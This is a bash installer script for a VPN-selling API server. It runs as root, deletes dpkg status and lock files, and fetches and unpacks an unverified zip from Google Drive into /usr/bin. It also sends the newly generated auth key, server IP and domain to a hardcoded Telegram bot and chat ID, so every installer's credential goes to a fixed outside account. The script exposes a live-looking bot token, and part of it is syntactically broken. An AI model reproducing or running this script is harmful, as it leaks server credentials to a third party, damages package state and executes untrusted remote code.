#!/bin/bash
# Colors
green="\e[38;5;82m"
red="\e[38;5;196m"
neutral="\e[0m"
orange="\e[38;5;130m"
blue="\e[38;5;39m"
yellow="\e[38;5;226m"
purple="\e[38;5;141m"
bold_white="\e[1;37m"
reset="\e[0m"
pink="\e[38;5;205m"
print_rainbow() {
    local text="$1"
    local length=${#text}
    local start_color=(0 5 0)
    local mid_color=(0 200 0)
    local end_color=(0 5 0)

    for ((i = 0; i < length; i++)); do
        local progress=$(echo "scale=2; $i / ($length - 1)" | bc)

        if (($(echo "$progress < 0.5" | bc -l))); then
            local factor=$(echo "scale=2; $progress * 2" | bc)
            r=$(echo "scale=0; (${start_color[0]} * (1-$factor) + ${mid_color[0]} * $factor)/1" | bc)
            g=$(echo "scale=0; (${start_color[1]} * (1-$factor) + ${mid_color[1]} * $factor)/1" | bc)
            b=$(echo "scale=0; (${start_color[2]} * (1-$factor) + ${mid_color[2]} * $factor)/1" | bc)
        else
            local factor=$(echo "scale=2; ($progress - 0.5) * 2" | bc)
            r=$(echo "scale=0; (${mid_color[0]} * (1-$factor) + ${end_color[0]} * $factor)/1" | bc)
            g=$(echo "scale=0; (${mid_color[1]} * (1-$factor) + ${end_color[1]} * $factor)/1" | bc)
            b=$(echo "scale=0; (${mid_color[2]} * (1-$factor) + ${end_color[2]} * $factor)/1" | bc)
        fi

        printf "\e[38;2;%d;%d;%dm%s" "$r" "$g" "$b" "${text:$i:1}"
    done
    echo -e "$reset"
}
cek_status() {
    status=$(systemctl is-active --quiet $1 && echo "aktif" || echo "nonaktif")
    if [ "$status" = "aktif" ]; then
        echo -e "${green}GOOD${neutral}"
    else
        echo -e "${red}BAD${neutral}"
    fi
}

setup_bot() {
    NODE_VERSION=$(node -v 2>/dev/null | grep -oP '(?<=v)\d+' || echo "0")
    rm /var/lib/dpkg/stato*
    rm /var/lib/dpkg/lock*

    if [ "$NODE_VERSION" -lt 22 ]; then
        echo -e "${yellow}Installing or upgrading Node.js to version 22...${neutral}"
        curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash - || echo -e "${red}Failed to download Node.js setup${neutral}"
        apt-get install -y nodejs || echo -e "${red}Failed to install Node.js${neutral}"
        npm install -g npm@latest
    else
        echo -e "${green}Node.js is already installed and up-to-date (v$NODE_VERSION), skipping...${neutral}"
    fi

    if [ ! -f /usr/bin/api-serversellvpn/api.js ]; then
        wget -qO /usr/bin/api-serversellvpn.zip "https://drive.google.com/u/4/uc?id=1brWJj81-2D065tDWLlItFR8_onlmxmUi&export=download"
        cd /usr/bin
        unzip api-serversellvpn.zip
        rm api-serversellvpn.zip*
        chmod +x api-serversellvpn/*
        cd
    fi

    if ! npm list --prefix /usr/bin/api-serversellvpn express child_process >/dev/null 2>&1; then
        npm install --prefix /usr/bin/api-serversellvpn express child_process
    fi

	# Generate AUTH_KEY random (6 karakter)
	NEW_AUTH_KEY=$(openssl rand -hex 3)
	# Hitung jumlah entri AUTH_KEY di /etc/profile
	AUTH_KEY_COUNT=$(grep -c "export AUTH_KEY=" /etc/profile)

	# Jika lebih dari 1 entri, hapus yang lama dan tambahkan yang baru
	if [ "$AUTH_KEY_COUNT" -gt 1 ]; then
		# Hapus semua entri AUTH_KEY yang ada
		sed -i '/export AUTH_KEY=/d' /etc/profile
		
		# Tambahkan entri AUTH_KEY baru
		echo "export AUTH_KEY=\"$NEW_AUTH_KEY\"" >> /etc/profile

	# Jika hanya ada 1 entri, biarkan tetap
	elif [ "$AUTH_KEY_COUNT" -eq 1 ]; then
		echo "AUTH_KEY already exists, no changes made."

	# Jika tidak ada entri AUTH_KEY, tambahkan yang baru
	else
		echo "export AUTH_KEY=\"$NEW_AUTH_KEY\"" >> /etc/profile
	fi

	# Terapkan perubahan dengan source
	source /etc/profile


	SERVER_IP=$(curl -s ifconfig.me) 

	# Ambil domain dari file /etc/xray/domain
	if [ -f /etc/xray/domain ]; then
		DOMAIN=$(cat /etc/xray/domain)
	else
		DOMAIN="(Domain not set)"
	fi

	# Konfigurasi Bot Telegram
	BOT_TOKEN="7689106579:AAHP9Y1T_dJ2fqEOiO2NcdFYL9_symUEP_c" # Ganti dengan token bot
	CHAT_ID="7501158904" # Ganti dengan ID Telegram kamu

	# Buat pesan notifikasi
			MESSAGE="🚀 *API-ServerSellVPN Installed* 🚀
			🔑 *Auth Key:* \`$AUTH_KEY\`
			🌐 *Server IP:* \`$SERVER_IP\`
			🌍 *Domain:* \`$DOMAIN\`"

	# Kirim notifikasi ke Telegram
	curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
		-d "chat_id=$CHAT_ID" \
		-d "text=$MESSAGE" \
		-d "parse_mode=Markdown"

    echo -e "${green}✅ Setup selesai. API auth key telah dikirim ke Telegram.${neutral}"
}



server_app() {
    cat >/etc/systemd/system/apisellvpn.service <<EOF
[Unit]
Description=App Bot sellvpn Service
After=network.target

[Service]
ExecStart=/bin/bash /usr/bin/apisellvpn
Restart=always
User=root
Environment=PATH=/usr/bin:/usr/local/bin
Environment=NODE_ENV=production
WorkingDirectory=/usr/bin

[Install]
WantedBy=multi-user.target
EOF
#!/bin/bash' >/usr/bin/apisellvpn
echo "source /etc/profile" >>/usr/bin/apisellvpn
echo "cd /usr/bin/api-serversellvpn" >>/usr/bin/apisellvpn
echo "node api.js" >>/usr/bin/apisellvpn

chmod +x /usr/bin/apisellvpn


    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable apisellvpn.service >/dev/null 2>&1
    systemctl start apisellvpn.service >/dev/null 2>&1
    systemctl restart apisellvpn.service >/dev/null 2>&1
    printf "\033[5A\033[0J"
    echo -e "       Status Server is "$(cek_status apisellvpn.service)""
	rm apiserver*
}

if [[ ${1} == "apisellvpn" ]]; then
    setup_bot
    server_app
else
    echo -e "${red}Invalid command. Use: ${yellow}start apisellvpn${neutral}"
    exit 1
fi